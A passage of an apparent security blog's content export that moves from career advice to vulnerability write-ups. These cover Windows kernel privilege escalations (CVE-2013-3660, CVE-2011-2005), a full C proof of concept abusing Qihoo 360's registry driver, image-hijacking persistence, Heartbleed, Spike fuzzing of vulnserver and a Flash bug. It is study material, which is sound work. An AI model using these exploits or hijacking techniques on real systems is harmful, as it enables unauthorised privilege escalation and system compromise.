框架或消息队列被用于内部系统之间的通信服务就如同信使一般，而数据库则负责记录结果，它更像是一名书记员。 组织人员：为了能够实现利用软件系统解决业务问题的目标，架构师还需要关注软件系统的构建过程，他以实现软件系统为号召，从公司组织中聚集一批软件工程师，并将这些人员按不同工种、不同职责、不同系统进行组织，确定这些人员之间的协作方式，并关注这个组织系统是否运作良好比如沟通是否顺畅、产出是否达到要求、能否按时间完成等。他非常关心软件的运行状况。因为只有在软件系统运行起来后，才能对外提供服务，才能在用户访问的过程中，解决业务问题。架构师需要关注运行过程中产生的数据比如业务成功率，系统运行资源占用数据、用户反馈信息、业务增长情况等，这些信息将会帮助架构师制定下一步架构目标和方向。 所以软件架构不仅仅只是选用什么框架、选用什么技术组件这么简单。它贯穿了对人的组织、对技术的组织、对业务的组织，并将这三种组织以解决业务问题这一目标有机的结合在了一起。 如何在阿里技术面试中脱颖而出？面试不要做的事 问一些知道性的问题比如问知不知道这个 API 干什么的，怎么调用，这个命令怎么用的，知道性的知识，google 一下或者认真看下文档就应该知道。 问一些特别复杂的问题比如问一个特别复杂的算法，问一个很抽象的大问题，短时间内很难给予回答。 问一些假设性的问题假设你参与了这个项目，你觉得哪几个地方需要优化。 还有就是不要在面试中试图证明别人不如自己 面试应该做的事 问已经发生的事情 问题解决思路 少问多听 STAR 原则 处境 (situation)在什么样的环境下 任务 (task)接到了什么样的任务 行动 (action)然后具体怎么落地的 结果 (result)拿到了什么结果 技术人如何不断成长？ 经验丰富，知识体系完整 保持良好的习惯，不忘总结和提升 哪些技术好书值得一读再读？这有一份经典书单-《Effective Software Testing》-《程序员修炼之道 - 从小工到专家》-《设计模式之禅》-《Spoken Language Processing: A Guide to Theory, Algorithm and System Development》-《机器学习导论》-《Reinforcement Learning: An Introduction》-《Programming Rust》-《Machine Learning: A Probabilistic Perspective》-《Architecture of a Database System》 阿里技术大牛最爱的“闲书”，你看过多少？-《从优秀到卓越》-《为什么精英都是时间控》-《创新者的窘境》-《魔鬼经济学》-《孙子兵法》-《创造自然》-《浮生六记》 reference阿里巴巴——《不止代码》 http://techforum-img.cn-hangzhou.oss-pub.aliyun-inc.com/1530517140411/Codelife.pdf","categories":[],"tags":[{"name":"不止代码","slug":"不止代码","permalink":"https://www.giantbranch.cn/tags/不止代码/"},{"name":"程序人生","slug":"程序人生","permalink":"https://www.giantbranch.cn/tags/程序人生/"},{"name":"极客人生","slug":"极客人生","permalink":"https://www.giantbranch.cn/tags/极客人生/"},{"name":"黑客人生","slug":"黑客人生","permalink":"https://www.giantbranch.cn/tags/黑客人生/"}]},{"title":"CVE-2013-3660-Windows win32k!EPATHOBJpprFlattenRec 指针未初始化本地提权漏洞","slug":"CVE-2013-3660-Windows win32k!EPATHOBJpprFlattenRec 指针未初始化本地提权漏洞","date":"2018-07-02T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/07/02/CVE-2013-3660-Windows win32k!EPATHOBJpprFlattenRec 指针未初始化本地提权漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/07/02/CVE-2013-3660-Windows win32k!EPATHOBJpprFlattenRec 指针未初始化本地提权漏洞/","excerpt":"","text":"环境 vs 2017windows 7 32位windbg 我用的是vs2017编译的poc.c(我这边的话需要设置 不使用预编译头)，但是在windows 7上没有崩溃 后来我使用看雪的poc编译(https://bbs.pediy.com/thread-178154.htm)，那就可以触发崩溃了 12345678910111213141516kd&gt; gAccess violation - code c0000005 (!!! second chance !!!)96748406 f6400810 test byte ptr [eax+8],10hkd&gt; kbChildEBP RetAddr Args to Child 8cdcace4 96857701 00000001 00000294 ff5b0998 win32k!EPATHOBJ::bFlatten+0x158cdcad28 8404b42a 38010d94 0012fe10 778464f4 win32k!NtGdiFlattenPath+0x508cdcad28 778464f4 38010d94 0012fe10 778464f4 nt!KiFastCallEntry+0x12a0012fdfc 775b68ed 775a6501 38010d94 0012fe1c ntdll!KiFastSystemCallRet0012fe00 775a6501 38010d94 0012fe1c 0012ff40 GDI32!NtGdiFlattenPath+0xc0012fe10 0042dffc 38010d94 006f1008 0048bc94 GDI32!FlattenPath+0x440012ff40 0042e57b 00000001 006f1008 006f1d38 ConsoleApplication1+0x2dffc0012ff88 770c1174 7ffd8000 0012ffd4 7785b3f5 ConsoleApplication1+0x2e57b0012ff94 7785b3f5 7ffd8000 7799c087 00000000 kernel32!BaseThreadInitThunk+0xe0012ffd4 7785b3c8 00428609 7ffd8000 00000000 ntdll!__RtlUserThreadStart+0x700012ffec 00000000 00428609 7ffd8000 00000000 ntdll!_RtlUserThreadStart+0x1b id打开win32k.sys 跟着作者，来着这个异常函数，里面调用了pprFlattenRec 123456789101112131415161718192021222324252627282930signed int __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this)&#123; EPATHOBJ *v1; // esi@1 int v2; // eax@1 signed int result; // eax@2 struct _PATHRECORD *i; // eax@3 v1 = this; v2 = *((_DWORD *)this + 2); if ( v2 ) &#123; for ( i = *(struct _PATHRECORD **)(v2 + 20); i; i = *(struct _PATHRECORD **)i ) &#123; if ( *((_BYTE *)i + 8) &amp; 0x10 ) &#123; i = EPATHOBJ::pprFlattenRec(v1, i); if ( !i ) goto LABEL_2; &#125; &#125; *(_DWORD *)v1 &amp;= 0xFFFFFFFE; result = 1; &#125; else &#123;LABEL_2: result = 0; &#125; return result;&#125; 在EPATHOBJ::pprFlattenRec之后调用EPATHOBJ::newpathrec，之后newpathalloc 1234567891011121314151617181920212223242526272829303132struct PATHALLOC *__stdcall newpathalloc()&#123; _DWORD *v0; // eax@1 void *v1; // ecx@2 _DWORD *v2; // esi@4 char v4; // [sp+4h] [bp-4h]@1 SEMOBJ::SEMOBJ((SEMOBJ *)&amp;v4, (struct HSEMAPHORE__ *)PATHALLOC::hsemFreelist); v0 = PATHALLOC::freelist; if ( PATHALLOC::freelist ) //假如freelist有，直接从里面获取，但是没有对获取的数据进行初始化操作，之后可能使用到被污染的数据 &#123; v1 = *(void **)PATHALLOC::freelist; --PATHALLOC::cFree; PATHALLOC::freelist = v1;LABEL_7: *v0 = 0; v0[2] = 4032; v0[1] = v0 + 3; v2 = v0; goto LABEL_5; &#125; v0 = (_DWORD *)PALLOCMEM(0xFC0u, 0x74617047u); if ( v0 ) &#123; ++PATHALLOC::cAllocated; goto LABEL_7; &#125; v2 = 0;LABEL_5: NEEDGRELOCK::vUnlock((NEEDGRELOCK *)&amp;v4); return (struct PATHALLOC *)v2;&#125; 我们添加结构体继续分析 1234567typedef struct _PATHRECORD &#123; struct _PATHRECORD *next; struct _PATHRECORD *prev; DWORD flags; DWORD numPoints; POINT points[0];&#125; PATHRECORD, *PPATHRECORD; 在 EPATHOBJ::pprFlattenRec里面，我们将v29转化成struct显示 123456789101112131415if ( EPATHOBJ::newpathrec(this, &amp;v29, &amp;v27, 0x7FFFFFFFu) == (struct PATHALLOC *)1 )&#123; v3 = v29; v4 = a2; v29-&gt;prev = a2-&gt;prev; v5 = &amp;v3-&gt;numPoints; v3-&gt;numPoints = 0; v3-&gt;flags = a2-&gt;flags &amp; 0xFFFFFFEF; if ( v3-&gt;prev ) v3-&gt;prev-&gt;next = v3; //v3即v29，也即上面提到的freelist，freelist可控，那么这里就可以任意写内核地址了 else *(_DWORD *)(*((_DWORD *)v28 + 2) + 20) = v3; ...... ...... 漏洞利用漏洞利用还是复杂了点，主要是新建了三个record 12345678910111213141516171819////PathRecord-&gt;next = self //stuck here to wait for WatchdogThread set PathRecord-&gt;next = ExploitRecord//PathRecord-&gt;flags = 0;PathRecord-&gt;next = PathRecord;PathRecord-&gt;prev = (PPATHRECORD)(0x42424242);ExploitRecordExit = (PPATHRECORD) *DispatchRedirect;ExploitRecordExit-&gt;next = NULL;ExploitRecordExit-&gt;prev = NULL;ExploitRecordExit-&gt;flags = PD_BEGINSUBPATH;ExploitRecordExit-&gt;count = 0;..........ExploitRecord.next = (PPATHRECORD) *DispatchRedirect;ExploitRecord.prev = (PPATHRECORD) &amp;HalDispatchTable[1];ExploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;ExploitRecord.count = 4; 填充freelist，据说是创建贝里尔曲线，以便在其直线化的时候调用漏洞函数 1234567// Generate a large number of Belier Curves made up of pointers to our // PATHRECORD object. for (PointNum = 0; PointNum &lt; MAX_POLYPOINTS; PointNum++) &#123; Points[PointNum].x = (ULONG)(PathRecord) &gt;&gt; 4; Points[PointNum].y = (ULONG)(PathRecord) &gt;&gt; 4; PointTypes[PointNum] = PT_BEZIERTO; &#125; 最后 v3-&gt;prev-&gt;next = v3; 就可以把HalDispatchTable改写 reference《漏洞战争》","categories":[],"tags":[{"name":"内核漏洞","slug":"内核漏洞","permalink":"https://www.giantbranch.cn/tags/内核漏洞/"},{"name":"本地提权漏洞","slug":"本地提权漏洞","permalink":"https://www.giantbranch.cn/tags/本地提权漏洞/"}]},{"title":"CTF PWN 做题环境一键搭建脚本","slug":"CTF PWN 做题环境一键搭建脚本","date":"2018-06-26T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/06/26/CTF PWN 做题环境一键搭建脚本/","link":"","permalink":"https://www.giantbranch.cn/2018/06/26/CTF PWN 做题环境一键搭建脚本/","excerpt":"","text":"有时候遇到一个新环境，每次做题输一次命令搭建环境挺烦的，所以写了一个脚本记录 地址如下（欢迎各位star）： https://github.com/giantbranch/pwn-env-init 说明如下： 为64位系统提供32位运行环境支撑 下载了libc6的源码，方便源码调试（可看这https://blog.csdn.net/u012763794/article/details/78457973） 给gdb装上pwndbg和peda插件 安装pwntools","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"做题环境","slug":"做题环境","permalink":"https://www.giantbranch.cn/tags/做题环境/"}]},{"title":"利用vps搭建离线下载服务器","slug":"利用vps搭建离线下载服务器","date":"2018-06-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/06/17/利用vps搭建离线下载服务器/","link":"","permalink":"https://www.giantbranch.cn/2018/06/17/利用vps搭建离线下载服务器/","excerpt":"","text":"安装项目的地址：https://github.com/aria2/aria2 不过我们直接apt就行 1apt install aria2 注：如果你要命令行下东西输入： aria2c &quot;url&quot; 还支持磁力链接什么的 启动后台服务配置文件可以参考http://aria2c.com/usage.html 需要自己修改dir，input-file和save-session这几个参数，其他参数可以自己调整，默认也可以 后台启动即可（建议先去掉-D看看有无错误，ipv6那个错误不用管，无错误ctrl+c停止后再用-D参数后台运行启动） 1aria2c --conf-path=/var/www/ariang/aria2.conf -D 注：conf文件需要自己新建，存放目录也可以自己新建 使用web界面我使用的AriaNg：https://github.com/mayswind/AriaNg/releases 下载zip包后直接解压到web目录即可 跟着就可以极速离线下载了 或者你直接使用别人的界面也是可以的，配置下json-rpc 的path就行 http://aria2c.com/ referencehttps://segmentfault.com/a/1190000008908995https://yorkchou.com/aria2.html","categories":[],"tags":[{"name":"离线下载","slug":"离线下载","permalink":"https://www.giantbranch.cn/tags/离线下载/"}]},{"title":"CVE-2011-2005-Microsoft Windows Afd.sys 本地提权漏洞","slug":"CVE-2011-2005-Microsoft Windows Afd.sys 本地提权漏洞","date":"2018-06-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/06/13/CVE-2011-2005-Microsoft Windows Afd.sys 本地提权漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/06/13/CVE-2011-2005-Microsoft Windows Afd.sys 本地提权漏洞/","excerpt":"","text":"从利用代码到漏洞函数的定位分析环境 windows XpIDA 6.8 exp: https://www.exploit-db.com/exploits/18176/ 可以看到是对AFDJoinLeaf函数的一个利用 12345678910111213141516171819## Trigger Pointer Overwrite print &quot;[*] Triggering AFDJoinLeaf pointer overwrite...&quot;IOCTL = 0x000120bb # AFDJoinLeafinputbuffer = 0x1004inputbuffer_size = 0x108outputbuffer_size = 0x0 # Bypass Probe for Writeoutputbuffer = HalDispatchTable0x4 + 0x1 # HalDispatchTable+0x4+1IoStatusBlock = c_ulong()NTSTATUS = ntdll.ZwDeviceIoControlFile(client, None, None, None, byref(IoStatusBlock), IOCTL, inputbuffer, inputbuffer_size, outputbuffer, outputbuffer_size ) 我看win7的afd.sys好像没有AFDJoinLeaf这个函数，后来用xp的了，注意的是IDA7.0看不大函数名，所以还是IDA6.8好了 function窗口搜索AFDJoinLeaf，跟过去 length不为0才会去检测UserBuffer，那么我们就可以有任意地址写入的漏洞了 利用的话还要下面限制 输入长度大于0x18 handle不为0 修复的话就直接检测UserBuffer的有效性，不管length是否设置为0 reference《漏洞战争》","categories":[],"tags":[{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://www.giantbranch.cn/tags/漏洞战争/"},{"name":"内核漏洞","slug":"内核漏洞","permalink":"https://www.giantbranch.cn/tags/内核漏洞/"},{"name":"af.sys","slug":"af-sys","permalink":"https://www.giantbranch.cn/tags/af-sys/"},{"name":"提权漏洞","slug":"提权漏洞","permalink":"https://www.giantbranch.cn/tags/提权漏洞/"}]},{"title":"Qihoo 360 Security Guard 6.1.5.1009 - breg device drivers Privilege Escalation","slug":"Qihoo 360 Security Guard 6.1.5.1009 - breg device drivers Privilege Escalation","date":"2018-06-12T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2018/06/12/Qihoo 360 Security Guard 6.1.5.1009 - breg device drivers Privilege Escalation/","link":"","permalink":"https://www.giantbranch.cn/2018/06/12/Qihoo 360 Security Guard 6.1.5.1009 - breg device drivers Privilege Escalation/","excerpt":"","text":"https://www.exploit-db.com/exploits/11317/ POC 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;windows.h&gt; typedef BOOL (WINAPI *INIT_REG_ENGINE)();typedef LONG (WINAPI *BREG_DELETE_KEY)(HKEY hKey, LPCSTR lpSubKey);typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);typedef LONG (WINAPI *REG_SET_VALUE_EX)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData); BREG_DELETE_KEY BRegDeleteKey = NULL;BREG_OPEN_KEY BRegOpenKey = NULL;BREG_CLOSE_KEY BRegCloseKey = NULL;REG_SET_VALUE_EX BRegSetValueEx = NULL; #define AppPath &quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\360safe.exe&quot; #define TestDeleteKey HKEY_LOCAL_MACHINE#define TestDeleteRegPath &quot;Software\\\\360Safe\\\\Update&quot; #define TestSetKey HKEY_LOCAL_MACHINE#define TestSetPath &quot;Software\\\\360Safe&quot; BOOL InitBRegDll()&#123; LONG lResult; HKEY hKey; CHAR cPath[MAX_PATH + 32] = &#123; 0 &#125;; DWORD dwPathLen = MAX_PATH; lResult = RegOpenKeyA(HKEY_LOCAL_MACHINE, AppPath, &amp;hKey); if (FAILED(lResult)) return FALSE; DWORD dwType = REG_SZ; lResult = RegQueryValueExA(hKey, &quot;Path&quot;, NULL, &amp;dwType, (LPBYTE)cPath, &amp;dwPathLen); RegCloseKey(hKey); if (FAILED(lResult)) return FALSE; strcat(cPath, &quot;\\\\deepscan\\\\BREGDLL.dll&lt;file://\\\\deepscan\\\\BREGDLL.dll&gt;&quot;); HMODULE modBReg = LoadLibraryA(cPath); if (!modBReg) return FALSE; INIT_REG_ENGINE InitRegEngine = (INIT_REG_ENGINE)GetProcAddress(modBReg, &quot;InitRegEngine&quot;); BRegDeleteKey = (BREG_DELETE_KEY)GetProcAddress(modBReg, &quot;BRegDeleteKey&quot;); BRegOpenKey = (BREG_OPEN_KEY)GetProcAddress(modBReg, &quot;BRegOpenKey&quot;); BRegCloseKey = (BREG_CLOSE_KEY)GetProcAddress(modBReg, &quot;BRegCloseKey&quot;); BRegSetValueEx = (REG_SET_VALUE_EX)GetProcAddress(modBReg, &quot;BRegSetValueEx&quot;); if (!InitRegEngine || !BRegDeleteKey || !BRegOpenKey || !BRegCloseKey || !BRegSetValueEx) &#123; FreeLibrary(modBReg); return FALSE; &#125; if (!InitRegEngine()) &#123; FreeLibrary(modBReg); return FALSE; &#125; return TRUE;&#125; LONG TestSetRegKey()&#123; HKEY hKey; LONG lResult; lResult = BRegOpenKey(TestSetKey, TestSetPath, &amp;hKey); if (FAILED(lResult)) return lResult; DWORD dwType = REG_SZ; static char szData[] = &quot;TEST VALUE&quot;; lResult = BRegSetValueEx(hKey, TestSetPath, NULL, dwType, (const BYTE *)&amp;szData, (DWORD)sizeof(szData)); BRegCloseKey(hKey); return lResult;&#125; int main(int argc, char *argv[])&#123; if (!InitBRegDll()) &#123; MessageBoxA(NULL, &quot;Initialization BReg error&amp;#65281;&quot;, &quot;error&quot;, MB_ICONSTOP); return 1; &#125; if (FAILED(BRegDeleteKey(TestDeleteKey, TestDeleteRegPath))) &#123; MessageBoxA(NULL, &quot;DeleteKey error&amp;#65281;&quot;, &quot;error&quot;, MB_ICONSTOP); return 2; &#125; if (FAILED(TestSetRegKey())) &#123; MessageBoxA(NULL, &quot;SetRegKey error&amp;#65281;&quot;, &quot;error&quot;, MB_ICONSTOP); return 3; &#125; MessageBoxA(NULL, &quot;Broke System Security Check&amp;#65292;Gain Escalated Privileges&amp;#65292;Successful exploit&amp;#65281;&quot;, &quot;Successful&quot;, MB_OK); return 0;&#125; 利用函数是在InitBRegDll，之后就拥有了修改360的注册表的权限了 可以看到只是将360的问题dll进行LoadLibraryA，之后获取里面对注册表操作的函数，那么之后就拥有了设置本来没有权限的注册表的能力 由于没有那个版本的360，只能看漏洞战争里面的分析了 原来是360自己实现了一套Ntxxx函数，调用底层未文档化的函数，而没有进行任何验证，导致可以被其他程序任意调用。 那么攻击者可以通过这个来修改注册表打开3389端口，劫持sethc.exe，成功获得权限 我们查看漏洞利用程序，利用的就是映像劫持技术 映像劫持主要通过修改注册表中的HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/项来劫持正常的程序，比如有一个病毒 vires.exe 要劫持qq程序，它会在上面注册表的位置新建一个qq.exe项，再在这个项下面新建一个字符串的键 debugger把其值改为C:/WINDOWS/ SYSTEM32/VIRES.EXE(这里是病毒藏身的目录)即可。","categories":[],"tags":[{"name":"内核漏洞","slug":"内核漏洞","permalink":"https://www.giantbranch.cn/tags/内核漏洞/"},{"name":"提权漏洞","slug":"提权漏洞","permalink":"https://www.giantbranch.cn/tags/提权漏洞/"}]},{"title":"逆向一个简单的VM crackme","slug":"逆向一个简单的VM crackme","date":"2018-06-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/06/11/逆向一个简单的VM crackme/","link":"","permalink":"https://www.giantbranch.cn/2018/06/11/逆向一个简单的VM crackme/","excerpt":"","text":"其实这个比较简单了，ida的f5都能清晰地看出来 123456789101112131415void __noreturn start()&#123; int v0; // eax@1 char *v1; // ST1C_4@1 char v2; // [sp+4h] [bp-90h]@1 MD5::MD5(&amp;v2); v0 = GetProcessHeap(0, 507); dword_40423C = (char *)HeapAlloc(v0); // 分配一段内存 memcpy(dword_40423C, &amp;unk_404040, 0x1FBu); // 将VM Code复制到这段内存 sub_4022E0(); // 这个函数里面是对40423c这段VM Code进行处理（虚拟执行） v1 = MD5::digestString((MD5 *)&amp;v2, dword_40423C);// 对其md5并输出 MessageBoxA(0, v1, &quot;We&apos;ve been compromised!&quot;, 48); ExitProcess(0);&#125; 我们看看sub_4022E0 12345678910111213141516171819202122char sub_4022E0()&#123; int one; // ST0C_4@2 unsigned __int8 v1; // ST1B_1@2 int two; // ST10_4@2 char three; // ST14_1@2 char result; // al@2 unsigned __int8 i; // [sp+Fh] [bp-1h]@1 i = 0; do &#123; // 可以看到处理是从255开始的 one = (unsigned __int8)dword_40423C[i + 255];// 取第一个字节 v1 = i + 1; two = (unsigned __int8)dword_40423C[v1++ + 255];// 接着取第二个字节 three = dword_40423C[v1 + 255]; // 上面取完后++了，这里是取第三个 i = v1 + 1; result = sub_402270(one, two, three); // 对传入的3个字节进行处理 &#125; while ( result ); return result;&#125; 我们再看sub_402270，这里就比较简单了，就是对第一个字节进行判断，跟着利用2，3个字节对dword_40423C后面的数据进行操作 123456789101112131415161718char __stdcall sub_402270(int a1, int a2, char a3)&#123; if ( a1 == 1 ) &#123; dword_40423C[a2] = a3; &#125; else if ( a1 == 2 ) &#123; byte_404240 = dword_40423C[a2]; &#125; else &#123; if ( a1 != 3 ) return 0; dword_40423C[a2] ^= byte_404240; &#125; return 1;&#125; 写代码 1234567891011121314151617181920212223242526272829303132class VM: def __init__(self, VM_ram): self.VM_Data = (bytearray)(VM_ram[:255]) self.VM_Code = VM_ram[255:] def VM_Run(self): ret = 1 i = 0 while ret: opcode = ord(self.VM_Code[i]) operand1 = ord(self.VM_Code[i + 1]) operand2 = ord(self.VM_Code[i + 2]) ret = self.decode(opcode, operand1, operand2) i = i + 3 def decode(self, opcode, operand1, operand2): if opcode == 1: self.VM_Data[operand1] = operand2 elif opcode == 2: self.tmp = self.VM_Data[operand1] else: if opcode != 3: return 0 self.VM_Data[operand1] = self.VM_Data[operand1] ^ self.tmp return 1with open(&quot;ram.bin&quot;, &apos;rb&apos;) as f: VM_ram = f.read()vm = VM(VM_ram)vm.VM_Run()print vm.VM_Data 结果 referencehttps://secrary.com/CrackMe/VM_1_MalwareTech/","categories":[],"tags":[{"name":"虚拟机","slug":"虚拟机","permalink":"https://www.giantbranch.cn/tags/虚拟机/"},{"name":"crackme","slug":"crackme","permalink":"https://www.giantbranch.cn/tags/crackme/"},{"name":"VM","slug":"VM","permalink":"https://www.giantbranch.cn/tags/VM/"}]},{"title":"CVE-2014-0160-OpenSSL TLS 数组越界访问漏洞（“心脏出血”漏洞）","slug":"CVE-2014-0160-OpenSSL TLS 数组越界访问漏洞（“心脏出血”漏洞）","date":"2018-06-10T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/06/10/CVE-2014-0160-OpenSSL TLS 数组越界访问漏洞（“心脏出血”漏洞）/","link":"","permalink":"https://www.giantbranch.cn/2018/06/10/CVE-2014-0160-OpenSSL TLS 数组越界访问漏洞（“心脏出血”漏洞）/","excerpt":"","text":"由于这个是开源的，直接源码对比https://bugzilla.redhat.com/attachment.cgi?id=883475&amp;action=diff 修复的另外一处也差不多 两处都对s-&gt;s3-&gt;rrec.length进行了判断 这个rrec结构如下： 1234567891011typedef struct ssl3_record_st &#123;/*r */ int type; /* type of record *//*rw*/ unsigned int length; /* How many bytes available *//*r */ unsigned int off; /* read/write offset into &apos;buf&apos; *//*rw*/ unsigned char *data; /* pointer to the record data *//*rw*/ unsigned char *input; /* where the decode bytes are *//*r */ unsigned char *comp; /* only used with decompression - malloc()ed *//*r */ unsigned long epoch; /* epoch number, needed by DTLS1 *//*r */ unsigned char seq_num[8]; /* sequence number, needed by DTLS1 */ &#125; SSL3_RECORD; length（心跳包的长度）是用户可控的，而payload（也是储存长度）是也是用户可控的，那么当payload长度大于心跳包的长度，那么就可以读取内存中心跳包后面的数据了 我们看看泄露这一步，首先是是malloc的大小，复制的大小都是payload这个变量 123456789101112buffer = OPENSSL_malloc(1 + 2 + payload + padding); //分配内存bp = buffer; //buffer即bp/* Enter response type, length and copy payload */*bp++ = TLS1_HB_RESPONSE;s2n(payload, bp);memcpy(bp, pl, payload); //复制到bpbp += payload;/* Random padding */RAND_pseudo_bytes(bp, padding);r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); //将前面复制到bp的数据，写到s结构的特定变量返回到用户（因为buffer就是bp） 那么这个就可以越界读取内存的信息，可能读取到密码什么的 再说说SSL3_RT_MAX_PLAIN_LENGTH那个，SSL3_RT_MAX_PLAIN_LENGTH在源码中找到是16384，所以这里的判断应该不是最重点，这个限制了最大长度 1#define SSL3_RT_MAX_PLAIN_LENGTH 16384","categories":[],"tags":[{"name":"数组越界","slug":"数组越界","permalink":"https://www.giantbranch.cn/tags/数组越界/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"}]},{"title":"Fuzzing with Spike","slug":"Fuzzing with Spike","date":"2018-06-07T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2018/06/07/Fuzzing with Spike/","link":"","permalink":"https://www.giantbranch.cn/2018/06/07/Fuzzing with Spike/","excerpt":"","text":"准备Spike这工具kali自带，我用的2017.1 先下载一个有漏洞的软件Vulnerable Server http://sites.google.com/site/lupingreycorner/vulnserver.zip或者下面地址https://samsclass.info/127/proj/vulnserver.zip 将服务器运行起来 通过netstat -ano或者软件的源代码，可以看到监听的是9999端口 小尝试我们先新建一个test文件，第一个是发送固定字符串，第二行是可变的字符串 123~/spikeFuzz/learn# cat test.spk s_string(&quot;giantbranch&quot;);s_string_variable(&quot;giantbranch&quot;); 我们在另一台机器用nc监听一下，当作一个服务器，-v可以查看相对详细的一些信息，l是listen，p就是指定道port，k就是keepalive，不然客户端断开，nc也断了 1nc -kvlp 6666 我们用的是下面这个工具，使用下面已经给出 1234root@kali:~/spikeFuzz/learn# generic_send_tcp argc=1Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR./generic_send_tcp 192.168.1.100 701 something.spk 0 0 开fuzz 12345678910111213141516171819202122root@kali:~/spikeFuzz/learn# generic_send_tcp 192.168.xxx.xxx 6666 test.spk 0 0Total Number of Strings is 681FuzzingFuzzing Variable 0:0Fuzzing Variable 0:1Variablesize= 5004Fuzzing Variable 0:2Variablesize= 5005Fuzzing Variable 0:3Variablesize= 21Fuzzing Variable 0:4Variablesize= 3Fuzzing Variable 0:5Variablesize= 2Fuzzing Variable 0:6Variablesize= 7Fuzzing Variable 0:7Variablesize= 48Fuzzing Variable 0:8Variablesize= 45Fuzzing Variable 0:9Variablesize= 49 查看服务端 实践fuzz vulnserver我们可以通过nc连接之后查看到服务器的功能 123456789101112131415161718~# nc 192.168.52.143 9999Welcome to Vulnerable Server! Enter HELP for help.HELPValid Commands:HELPSTATS [stat_value]RTIME [rtime_value]LTIME [ltime_value]SRUN [srun_value]TRUN [trun_value]GMON [gmon_value]GDOG [gdog_value]KSTET [kstet_value]GTER [gter_value]HTER [hter_value]LTER [lter_value]KSTAN [lstan_value]EXIT 文章fuzz的是TRUN命令 123s_readline();s_string(&quot;TRUN &quot;);s_string_variable(&quot;COMMAND&quot;); 我们Immunity Debug附加上服务器后，开fuzz 1root@kali:~/spikeFuzz/learn# generic_send_tcp 192.168.52.138 9999 trun.spk 0 0 很快，EIP被覆盖了 我们这次打开wireshark抓包 我们可以看到是端口58644的蹦了，那我们过滤，并追踪tcp流 1tcp.port == 58644 可以看到应该就是这个包了 我们生成一些定位字符 1!mona pattern_create 2008 eip覆盖为6f43376f ，计算出偏移是2002，在去调试 12345678910111213140:001&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.017ef9dc 0033000a 00333878 00000bb8 00000000 0x42424242017ef9f0 77d3517e 768b6767 00000000 00000000 0x33000a017efa18 77cc349f 017efb04 77c8d74d 00398dff ntdll!RtlpNtMakeTemporaryKey+0x43ba017efa2c 77d3517e 77cf7d96 00510000 502c016b ntdll!RtlTryEnterCriticalSection+0x98f017efa30 77cf7d96 00510000 502c016b 77cc349f ntdll!RtlpNtMakeTemporaryKey+0x43ba017efa3c 77cc349f 768b6643 7ffdd000 00000000 ntdll!RtlTimeToElapsedTimeFields+0xe902017efb10 77cc349f 77cc34ca 00000208 00000000 ntdll!RtlTryEnterCriticalSection+0x98f017efb14 77cc34ca 00000208 00000000 00000000 ntdll!RtlTryEnterCriticalSection+0x98f*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Windows\\system32\\WS2_32.DLL - 017efb3c 7638140a 5d13f74a 017efc84 00000000 ntdll!RtlTryEnterCriticalSection+0x9ba00000000 00000000 00000000 00000000 00000000 WS2_32!Ordinal490+0x140a 就是特地在里面写了个strcpy referencehttps://samsclass.info/127/proj/p18-spike.htm","categories":[],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"},{"name":"Spike","slug":"Spike","permalink":"https://www.giantbranch.cn/tags/Spike/"}]},{"title":"CVE-2011-2110 Adobe Flash Player 数组越界索引漏洞","slug":"CVE-2011-2110 Adobe Flash Player 数组越界索引漏洞","date":"2018-06-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/06/06/CVE-2011-2110 Adobe Flash Player 数组越界索引漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/06/06/CVE-2011-2110 Adobe Flash Player 数组越界索引漏洞/","excerpt":"","text":"实验环境 windows 7idaJPEXS Free Flash DecompilerAdobe Flash Player 10.3.181.22 样本分析软件下载：http://fpdownload.macromedia.com/get/flashplayer/installers/archive/fp_10.3.181.22_archive.zip 国内下载建议翻墙，国内被2144.com代理了 安装限制解决 修改注册表就好，（假如安装10.3.xxx，10也要删掉） 打开样本，可以看到，样本是加载main.swf,并传递一个info的参数 是根据是否为IE浏览器而设置的，第一处是针对IE，第二三处是针对非IE的（有个叹号嘛） 我们反编译下swf，并搜索info，查看对info参数的操作 这是将info参数转化为二进制后，再每个字节异或122，最后uncompress 12345678910var param:Object = root.loaderInfo.parameters;var t_url:ByteArray = this.hexToBin(param[&quot;info&quot;]);i = 0;i = 0;while(i &lt; t_url.length)&#123;t_url[i] = 